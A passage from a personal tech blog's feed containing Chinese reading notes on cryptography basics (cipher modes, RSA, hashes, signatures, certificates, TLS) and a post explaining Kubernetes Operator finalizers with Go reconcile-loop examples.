优势：</p><ul><li>加密锁需要的轮数更少</li><li>所有处理均按照字节为单位进行，速度更快</li></ul><p>劣势：</p><ul><li>无法使用同一种结构实现加密和解密</li></ul><h3 id="分组密码的模式"><a href="#分组密码的模式" class="headerlink" title="分组密码的模式"></a>分组密码的模式</h3><p>分组密码是每次只能处理特定长度的一块数据的一类密码算法，一个分组的比特书就称为分组长度。</p><p>例如 DES 和三重 DES 的分组长度都是 64 比特，也就是会所一次只能加密64 比特的明文，并生成64 比特的密文。</p><p>当对一段很长的明文进行加密时，的呆的方法就称为分组密钥的模式。<br>主要模式有以下5种：</p><ul><li>ECB 模式，电子密码本模式</li><li>CBC 模式，密码分组链接模式</li><li>CFB 模式，密文反馈模式</li><li>OFB 模式，输出反馈模式</li><li>CTR 模式，计数器模式</li></ul><p>ECB 模式，将明文分组加密之后的结果直接称为密文分组，若分组内容小于分组长度时，则自动向上填充。</p><p>弱点：可以在步破译密文的情况下操纵明文。</p><p>CBC 模式，首先将明文分组与前一个密文分组进行 XOR 运算，然后再进行加密。</p><p>CFB 模式，前一个密文分组会被送回到密码算法的输入端，即初始化向量通过加密算法与明文分组进行异或运算，得到密文分组。</p><p>OFB 模式，密码算法的输出会反馈到密码算法的输入中，通过将明文分组和密码算法的输出进行异或运算来产生密文分组。</p><p>CTR 模式，通过将逐次累加的计数器进行加密来生成密钥流的流密码。每个分组对应一个逐次累加的计数器，并通过对计数器进行加密来生成密钥流，也就是说，最终的密钥分组时通过将计数器加密得到的比特序列与明文分组进行异或运算得到的。</p><h3 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h3><p>公钥密码是密码学历史上最伟大的发明，是数学史上最伟大的发现。</p><p>公钥密码解决的问题：密钥发送。</p><p>在公钥密码中，密钥氛围加密密钥和解密密钥两种，发送者用加密密钥对消息进行加密，接收者用解密密钥对密文进行解密。</p><p>注意：</p><ol><li>发送者只需要加密密钥</li><li>接收者值需要解密密钥</li><li>解密密钥步可以被窃听者窃取</li><li>加密密钥被窃听者获取也没问题</li></ol><p>RSA 是一种公钥密码算法，被用于公钥密码和数字签名。<br>加密公式：对代表明文的数字的 E 次方球 mod N 的结果，结果就是密文。其中 E 和 N 是 RSA 加密的密钥，也就是E 和 N 的组合就是公钥。</p><p>解密公式：对代表密文的数字的 D 次方球 mod N 就可以得到明文，其中 N 与加密算法中的N 是相同的。</p><p>生成密钥对流程：</p><ol><li>求 N<ol><li>准备两个很大的质数，假设为 p 和 q，并将其相乘，结果为 N</li></ol></li><li>求 L<ol><li>L 是 p-1 和 q-1 的最小公倍数</li></ol></li><li>求 E<ol><li>E 是一个比 1 大，比 L 小的数，E 和 L 的最大公约数必须为 1</li></ol></li><li>求 D<ol><li>1 &lt; D &lt; L</li><li>E * D mod L = 1</li></ol></li></ol><h3 id="混合密码系统"><a href="#混合密码系统" class="headerlink" title="混合密码系统"></a>混合密码系统</h3><p>公钥密码劣势：</p><ol><li>公钥密钥处理速度远远低于对称密码</li><li>公钥密码难以抵御中间人攻击</li></ol><p>混合密码主要解决上述问题 1。有以下机制：</p><ol><li>用对称密码加密消息</li><li>通过伪随机数生成器生成对称密码加密中使用的会话密钥</li><li>用公钥密码加密会话密钥</li><li>从混合密码系统外部赋予公钥密码加密时使用的密钥</li></ol><img src="/2019/09/14/《图解密码技术》读书笔记/2.png" title="img2"><img src="/2019/09/14/《图解密码技术》读书笔记/3.png" title="img3"><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><h3 id="单向散列函数"><a href="#单向散列函数" class="headerlink" title="单向散列函数"></a>单向散列函数</h3><p>单向散列函数有一个输入和一个输出，输入称为消息，输出称为散列值，函数可以根据消息的内容计算出散列值，可以根据散列值来检查消息的完整性。</p><p>特性：</p><ol><li>根据任意长度的消息计算出固定长度的散列值</li><li>能够快速计算出散列值</li><li>消息不同散列值也不同</li><li>具备单向性</li></ol><p>实际应用：</p><ol><li>检测软件是否被篡改</li><li>基于口令的加密</li><li>消息认证码</li><li>数字签名</li><li>伪随机数生成器</li><li>一次性口令</li></ol><p>具体例子：</p><ol><li>MD4，MD5</li><li>SHA-1，SHA-256，SHA-384，SHA-512</li><li>RIPEMD-160</li><li>AHS，SHA-3</li></ol><p>单向散列函数能够辨别出篡改，但是无法辨别出伪装。当我们想要确定文件的所有者时谁，需要进行认证。用于认证的技术包括消息验证码和数字签名。消息认证码能够想通信对象保证消息没有被篡改，而数字签名不仅能够向通信对象保证消息没有被篡改，还能够向所有第三方作出这样的保证。</p><h3 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h3><p>在消息传递时，需要关注完整性和认证两个性质。</p><p>消息认证码是一种确认完整性并进行认证的技术，简称 MAC。消息认证码的输入包括任意长度的消息和一个发送者与接收者之间共享的密钥，它可以输出固定长度的数据，这个数据称为 MAC 值。简单理解：消息认证码是一种与密钥相关联的单向散列函数。</p><p>无法解决的问题：</p><ol><li>对第三方证明</li><li>防止否认</li></ol><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>为什么要使用数字签名：</p><ul><li>消息认证码的局限性</li><li>消息认证码无法防止否认，发送者与接收者共享同一个密钥，对第三方来说，无法确认消息是谁发送的</li></ul><p>签名的生成和验证</p><ul><li>生成消息签名的行为<ul><li>由消息的发送者完成，意味着“发送者认可该消息的内容”</li><li>发送者使用签名密钥生成消息的签名</li><li>签名密钥只能由签名人持有</li></ul></li><li>验证消息签名的行为<ul><li>一般由消息的接收者完成，也可以由需要验证消息的第三方来完成</li><li>接收者使用验证密钥进行密钥的验证</li><li>验证密钥无法生成签名</li><li>验证密钥可以是任何由需要验证签名的人持有</li></ul></li></ul><p>公钥密钥使用公钥加密，使用私钥解密；</p><p>数字签名使用私钥签发，使用公钥验证。</p><img src="/2019/09/14/《图解密码技术》读书笔记/4.png" title="img4"><p>缺点：</p><ul><li>无法判断公钥是否属于签发者</li></ul><h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>公钥证书与驾照类似，记录着姓名、组织、邮箱地址等个人信息以及属于此人的公钥，并由认证机构施加数字签名，公钥证书简称证书。</p><p>典型使用流程：</p><ol><li>接收者生成密钥对</li><li>接收者在认证结构 Trent 注册自己的公钥</li><li>认证结构 Trent 用自己的私钥对 Bob 的公钥施加数字签名并生成证书</li><li>发送者得到带有认证机构 Trent 的数字签名的接收者的公钥（证书）</li><li>发送者使用认证机构 Trent 的公钥验证数字签名，确认接收者公钥的合法性</li><li>发送者使用接收者的公钥加密消息并发送到接收者</li><li>接收者使用自己的私钥解密密文得到发送者的消息</li></ol><p>公钥基础设施是为了能够更有效的运用公钥而指定的一系列规范和规格的总称，简称 PKI。</p><p>组成要素：</p><ol><li>用户—使用 PKI 的人</li><li>认证机构—颁发证书的人</li><li>仓库—保存证书的数据库</li></ol><h2 id="密钥、随机数与应用技术"><a href="#密钥、随机数与应用技术" class="headerlink" title="密钥、随机数与应用技术"></a>密钥、随机数与应用技术</h2><h3 id="密钥"><a href="#密钥" class="headerlink" title="密钥"></a>密钥</h3><p>密钥就是一个巨大的数字，数字本身不重要，重要的是密钥空间的大小，空间越大，暴力破解就越困难，空间的大小是由密钥长度决定的。</p><p>密钥与明文是等价的，明文的价值就是密钥的价值。</p><p>密钥的用途：</p><ul><li>在对称密码中，由于发送者和接收者之间需要共享密钥，因此对称密钥又称为共享密钥密码。</li><li>在公钥密码中，加密和解密使用的是不同的密钥，加密的是公钥，解密的是私钥，私钥也称为私密密钥，公钥与私钥也称为密钥对。</li><li>对称密码和公钥密钥的密钥都是用于确保机密性的密钥，相对的，消息认证码和数字签名所使用的密钥，则是用于认证的密钥。</li></ul><p>密钥的管理：</p><ul><li>生成密钥<ul><li>用随机数生成密钥</li><li>用口令生成密钥</li></ul></li><li>配送密钥<ul><li>事先共享密钥</li><li>使用公钥密码</li><li>Diffie-Hellman 密钥交换</li></ul></li><li>更新密钥<ul><li>用当前密钥的散列值作为下一个密钥</li></ul></li><li>保存密钥<ul><li>人类无法记住密钥</li><li>保存在保险柜等安全的地方</li><li>将密钥加密后保存</li><li>减少需要保管的密钥数量</li></ul></li><li>作废密钥<ul><li>删除密钥的同时，需要将对应的加密后文件一同删除</li></ul></li></ul><p>如何生成安全的口令</p><ul><li>使用只有自己才能知道的信息<ul><li>不要使用对自己重要的事物的名字</li><li>不要使用关于自己的信息</li><li>不要使用别人见过的信息</li></ul></li><li>将多个不同的口令分开使用</li><li>有效利用笔记</li><li>理解口令的局限性</li></ul><h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><p>为了不让攻击者看穿而使用随机数。</p><p>应用场景：</p><ul><li>生成密钥<ul><li>用于对称密码和消息认证码</li></ul></li><li>生成密钥对<ul><li>用于公钥密码和数字签名</li></ul></li><li>生成初始化向量<ul><li>用于分组密码的 CBC、CFB、OFB 模式</li></ul></li><li>生成 nonce<ul><li>用于防御重放攻击以及分组密码的 CTR 模式等</li></ul></li><li>生成盐<ul><li>用于基于口令的密码等</li></ul></li></ul><p>随机数的性质：</p><ul><li>随机性—不存在统计学偏差，完全杂乱的数列</li><li>不可预测行—不能从过去的数列推测出下一个出现的数</li><li>不可重现性—除非将数列本身保存下来，否则不能重现相同的数列</li></ul><h3 id="PGP"><a href="#PGP" class="headerlink" title="PGP"></a>PGP</h3><p>PGP（Pretty Good Privary）是一款密码软件，支持多平台。</p><p>功能列表：</p><ol><li>对称密码</li><li>公钥密码</li><li>数字签名</li><li>单向散列函数</li><li>证书</li><li>压缩</li><li>文本数据</li><li>大文件的拆分和拼合</li><li>钥匙串管理</li></ol><p>加密流程：</p><img src="/2019/09/14/《图解密码技术》读书笔记/5.png" title="img5"><p>解密流程：</p><img src="/2019/09/14/《图解密码技术》读书笔记/6.png" title="img6"><h3 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL/TLS"></a>SSL/TLS</h3><p>SSL(Secure Socket Layer)<br>TLS(Transport Layer Security)</p><p>当 Web 浏览器发送请求时，请求的数据会作为客户端请求发送给服务器，如果通信内容被窃听者所窃取，那么窃听者就会得到请求数据。可以使用 SSL/TLS 作为对通信进行加密的协议，然后再次智商承载 HTTP。通过将两种协议进行叠加，我们就可以对HTTP 的通信进行加密，防止窃听。通过 SSL/TLS 进行通信时，URL 以 https 开头。</p><p>解决问题：</p><ul><li>机密性问题<ul><li>解决方式：对称密码、伪随机数生成器、公钥密码</li></ul></li><li>完整性问题<ul><li>解决方式：消息认证码</li></ul></li><li>认证问题<ul><li>解决方式：数字签名</li></ul></li></ul><p>SSL 与 TLS 区别：<br>SSL 是 1994年由王晶公司设计的一种协议，于1995年发布了3.0 版本。<br>TLS 设市 IETF 基于 SSL 3.0 版本的基础上设计的协议，在 1999年发布了 TLS 1.0 版本，实际上相当于 SSL 3.1。2006 年发布 TLS 1.1 版本，在对称密码算法中加入了 AES 支持。</p><p>SSL/TLS 使用到的密码技术：</p><ul><li>公钥密码<ul><li>加密预备主密码</li></ul></li><li>单向散列函数<ul><li>构成伪随机数生成器</li></ul></li><li>数字签名<ul><li>验证服务器和客户端的证书</li></ul></li><li>伪随机数生成器<ul><li>生成预备主密码</li><li>根据主密码生成密钥</li><li>生成初始化向量</li></ul></li><li>对称密码<ul><li>确保片段的机密性</li></ul></li><li>消息认证码<ul><li>确保片段的完整性并进行认证</li></ul></li></ul><h3 id="密码技术与现实社会"><a href="#密码技术与现实社会" class="headerlink" title="密码技术与现实社会"></a>密码技术与现实社会</h3><p>密码的作用是为了确保机密性，将明文转换为密文。转换之后，密文不需要保护了，需要保护的是加密时使用的密钥。通过保护较短的密钥来保护较长的明文，称为机密性的压缩。</p><p>单向散列函数时用于确认完整性的，不必检查较长的明文的完整性，只要检查散列值就能确认，这种做法称为完整性的压缩。</p><p>消息认证码和数字签名都是用于认证的技术，通过较短的认证富豪来对较长的消息进行认证，称为认证的压缩。</p><p>只有完美的密码，没有完美的人。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;自己对于密码技术相关的知识一直都是零散的，刚接触 k8s 的时候遇到了好多证书问题都是靠临时搜索解决的，不成体系。&lt;/p&gt;
&lt;p&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="Book" scheme="https://zdyxry.github.io/tags/Book/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-Operator Finalizers 实现</title>
    <link href="https://zdyxry.github.io/2019/09/13/Kubernetes-%E5%AE%9E%E6%88%98-Operator-Finalizers/"/>
    <id>https://zdyxry.github.io/2019/09/13/Kubernetes-实战-Operator-Finalizers/</id>
    <published>2019-09-13T12:24:41.000Z</published>
    <updated>2019-09-13T14:07:29.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在写 k8s Operator，在看示例的时候看到 controller 都会设置 Finalizers，今天来聊一聊 Finalizers 和相关实现。</p><h2 id="Finalizers"><a href="#Finalizers" class="headerlink" title="Finalizers"></a>Finalizers</h2><p>Finalizers 允许 Operator 控制器实现异步的 pre-delete hook。比如你给 API 类型中的每个对象都创建了对应的外部资源，你希望在 k8s 删除对应资源时同时删除关联的外部资源，那么可以通过 Finalizers 来实现。</p><p>Finalizers 是由字符串组成的列表，当 Finalizers 字段存在时，相关资源不允许被强制删除。存在 Finalizers 字段的的资源对象接收的第一个删除请求设置 <code>metadata.deletionTimestamp</code> 字段的值， 但不删除具体资源，在该字段设置后， <code>finalizer</code> 列表中的对象只能被删除，不能做其他操作。</p><p>当 <code>metadata.deletionTimestamp</code> 字段非空时，controller watch 对象并执行对应 finalizers 的动作，当所有动作执行完后，需要清空 finalizers ，之后 k8s 会删除真正想要删除的资源。</p><h2 id="Operator-finalizers-使用"><a href="#Operator-finalizers-使用" class="headerlink" title="Operator finalizers 使用"></a>Operator finalizers 使用</h2><p>介绍了 Finalizers 概念，那么我们来看看在 Operator 中如何使用，在 Operator Controller 中，最重要的逻辑就是 Reconcile 方法，finalizers 也是在 Reconcile 中实现的。要注意的是，设置了 Finalizers 会导致 k8s 的 delete 动作转为设置 <code>metadata.deletionTimestamp</code> 字段，如果你通过 <code>kubectl get</code> 命令看到资源存在这个字段，则表示资源正在删除（deleting）。</p><p>有以下几点需要理解：</p><ol><li>如果资源对象未被删除且未设置 finalizers，则添加 finalizer并更新 k8s 资源对象；</li><li>如果正在删除资源对象并且 finalizers 仍然存在于 finalizers 列表中，则执行 pre-delete hook并删除 finalizers ，更新资源对象；</li><li>由于以上两点，需要确保 pre-delete hook是幂等的。</li></ol><h3 id="kuberbuilder-示例"><a href="#kuberbuilder-示例" class="headerlink" title="kuberbuilder 示例"></a>kuberbuilder 示例</h3><p>我们来看一个 kubebuilder 官方示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *CronJobReconciler)</span> <span class="title">Reconcile</span><span class="params">(req ctrl.Request)</span> <span class="params">(ctrl.Result, error)</span></span> &#123;</span><br><span class="line">    ctx := context.Background()</span><br><span class="line">    log := r.Log.WithValues(<span class="string">"cronjob"</span>, req.NamespacedName)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> cronJob batch.CronJob</span><br><span class="line">    <span class="keyword">if</span> err := r.Get(ctx, req.NamespacedName, &amp;cronJob); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Error(err, <span class="string">"unable to fetch CronJob"</span>)</span><br><span class="line">        <span class="keyword">return</span> ctrl.Result&#123;&#125;, ignoreNotFound(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明 finalizer 字段，类型为字符串</span></span><br><span class="line">    myFinalizerName := <span class="string">"storage.finalizers.tutorial.kubebuilder.io"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过检查 DeletionTimestamp 字段是否为0 判断资源是否被删除</span></span><br><span class="line">    <span class="keyword">if</span> cronJob.ObjectMeta.DeletionTimestamp.IsZero() &#123;</span><br><span class="line">        <span class="comment">// 如果为0 ，则资源未被删除，我们需要检测是否存在 finalizer，如果不存在，则添加，并更新到资源对象中</span></span><br><span class="line">        <span class="keyword">if</span> !containsString(cronJob.ObjectMeta.Finalizers, myFinalizerName) &#123;</span><br><span class="line">            cronJob.ObjectMeta.Finalizers = <span class="built_in">append</span>(cronJob.ObjectMeta.Finalizers, myFinalizerName)</span><br><span class="line">            <span class="keyword">if</span> err := r.Update(context.Background(), cronJob); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ctrl.Result&#123;&#125;, err</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果不为 0 ，则对象处于删除中</span></span><br><span class="line">        <span class="keyword">if</span> containsString(cronJob.ObjectMeta.Finalizers, myFinalizerName) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 finalizer 且与上述声明的 finalizer 匹配，那么执行对应 hook 逻辑</span></span><br><span class="line">            <span class="keyword">if</span> err := r.deleteExternalResources(cronJob); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="comment">// 如果删除失败，则直接返回对应 err，controller 会自动执行重试逻辑</span></span><br><span class="line">                <span class="keyword">return</span> ctrl.Result&#123;&#125;, err</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果对应 hook 执行成功，那么清空 finalizers， k8s 删除对应资源</span></span><br><span class="line">            cronJob.ObjectMeta.Finalizers = removeString(cronJob.ObjectMeta.Finalizers, myFinalizerName)</span><br><span class="line">            <span class="keyword">if</span> err := r.Update(context.Background(), cronJob); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ctrl.Result&#123;&#125;, err</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctrl.Result&#123;&#125;, err</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Reconciler)</span> <span class="title">deleteExternalResources</span><span class="params">(cronJob *batch.CronJob)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 删除 crobJob关联的外部资源逻辑</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 需要确保实现是幂等的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">containsString</span><span class="params">(slice []<span class="keyword">string</span>, s <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, item := <span class="keyword">range</span> slice &#123;</span><br><span class="line">        <span class="keyword">if</span> item == s &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeString</span><span class="params">(slice []<span class="keyword">string</span>, s <span class="keyword">string</span>)</span> <span class="params">(result []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, item := <span class="keyword">range</span> slice &#123;</span><br><span class="line">        <span class="keyword">if</span> item == s &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="built_in">append</span>(result, item)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cluster-api-provider-vsphere-实现"><a href="#cluster-api-provider-vsphere-实现" class="headerlink" title="cluster-api-provider-vsphere 实现"></a>cluster-api-provider-vsphere 实现</h3><p>看完了示例，我们来招一个具体项目看看，cluster-api-provider-vsphere 是 cluster-api 相关项目，用于提供 vsphere 相关资源创建的 Operator，采用 kubebuilder 来实现的。</p><p>vspheremachine_controller.go 中实现了 Reconcile 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reconcile ensures the back-end state reflects the Kubernetes resource state intent.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *VSphereMachineReconciler)</span> <span class="title">Reconcile</span><span class="params">(req ctrl.Request)</span> <span class="params">(_ ctrl.Result, reterr error)</span></span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// Always close the context when exiting this function so we can persist any VSphereMachine changes.</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := machineContext.Patch(); err != <span class="literal">nil</span> &amp;&amp; reterr == <span class="literal">nil</span> &#123;</span><br><span class="line">reterr = err</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle deleted machines</span></span><br><span class="line"><span class="keyword">if</span> !vsphereMachine.ObjectMeta.DeletionTimestamp.IsZero() &#123;</span><br><span class="line"><span class="keyword">return</span> r.reconcileDelete(machineContext)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle non-deleted machines</span></span><br><span class="line"><span class="keyword">return</span> r.reconcileNormal(machineContext)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>Reconcile</code> 中检测了 <code>DeletionTimestamp</code> 是否为0 ，如果不为0 ，则表示资源处于正在删除中，那么来看下 <code>reconcileDelete</code> 实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *VSphereMachineReconciler)</span> <span class="title">reconcileDelete</span><span class="params">(ctx *context.MachineContext)</span> <span class="params">(reconcile.Result, error)</span></span> &#123;</span><br><span class="line">ctx.Logger.Info(<span class="string">"Handling deleted VSphereMachine"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vmService services.VirtualMachineService = &amp;govmomi.VMService&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行删除虚拟机逻辑</span></span><br><span class="line">vm, err := vmService.DestroyVM(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="comment">// 如果删除失败，则直接返回错误，controller 会自动重试</span></span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, errors.Wrapf(err, <span class="string">"failed to destroy VM"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新调度删除虚拟机逻辑，直到虚拟机状态处于 notfound 状态</span></span><br><span class="line"><span class="keyword">if</span> vm.State != infrav1.VirtualMachineStateNotFound &#123;</span><br><span class="line">ctx.Logger.V(<span class="number">6</span>).Info(<span class="string">"requeuing operation until vm state is reconciled"</span>, <span class="string">"expected-vm-state"</span>, infrav1.VirtualMachineStateNotFound, <span class="string">"actual-vm-state"</span>, vm.State)</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;RequeueAfter: config.DefaultRequeue&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pre-delete hook执行成功，也就是上面的删除虚拟机逻辑执行成功，则清空 Finalizers</span></span><br><span class="line">ctx.VSphereMachine.Finalizers = clusterutilv1.Filter(ctx.VSphereMachine.Finalizers, infrav1.MachineFinalizer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到整体逻辑与示例的使用是一致的，主要通过这种方式来达到 pre-delete hook 的效果。</p><h3 id="k8s-initializer-finalizer-practice"><a href="#k8s-initializer-finalizer-practice" class="headerlink" title="k8s-initializer-finalizer-practice"></a>k8s-initializer-finalizer-practice</h3><p>在搜索相关资料的时候，看到有人在 SO 上问了如何使用的<a href="https://stackoverflow.com/questions/53057185/kubernetes-crd-finalizer" target="_blank" rel="noopener">问题</a>，其中有个回答中附上了一个练习项目，项目很小，很适合了解 Finalizers 概念。</p><p>相关逻辑如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">customdeployment:=obj.(*crdv1alpha1.CustomDeployment).DeepCopy()</span><br><span class="line">fmt.Println(<span class="string">"Event.............................."</span>)</span><br><span class="line"><span class="keyword">if</span> customdeployment.DeletionTimestamp != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="comment">// check if it has finalizer</span></span><br><span class="line"><span class="keyword">if</span> customdeployment.GetFinalizers()!=<span class="literal">nil</span>&#123;</span><br><span class="line">finalizers:=customdeployment.GetFinalizers()</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if first finalizer match with deletepod.crd.emruz.com</span></span><br><span class="line"><span class="keyword">if</span> finalizers[<span class="number">0</span>]==<span class="string">"deletepods.crd.emruz.com"</span>&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">_,err:=myutil.PatchCustomDeployment(c.clientset,customdeployment, <span class="function"><span class="keyword">func</span><span class="params">(deployment *crdv1alpha1.CustomDeployment)</span> *<span class="title">crdv1alpha1</span>.<span class="title">CustomDeployment</span></span> &#123;</span><br><span class="line"><span class="comment">// delete pods under this deployment</span></span><br><span class="line">err:=myutil.DeletePods(c.kubeclient,c.podLabel)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Failed to remove all pods. Reason: "</span>,err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// pods sucessfully removed. remove the finalizer</span></span><br><span class="line">customdeployment.ObjectMeta=myutil.RemoveFinalizer(customdeployment.ObjectMeta)</span><br><span class="line"><span class="keyword">return</span> customdeployment</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在开发 Operator 时，pre-delete 